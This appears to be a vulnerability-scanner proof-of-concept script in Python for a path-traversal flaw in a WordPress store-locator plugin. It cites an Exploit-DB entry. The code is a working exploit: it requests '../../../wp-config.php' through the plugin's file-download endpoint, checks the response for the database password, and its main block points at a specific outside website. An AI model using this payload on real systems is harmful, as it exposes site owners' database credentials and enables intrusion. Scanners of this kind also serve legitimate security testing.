#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '半块西瓜皮'
#http://www.exploit-db.com/exploits/35493/

import  re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = 'wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php'
    verify_url = arg  + payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    if code == 200 and 'DB_PASSWORD' in res:
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.misssky.cn/')[1])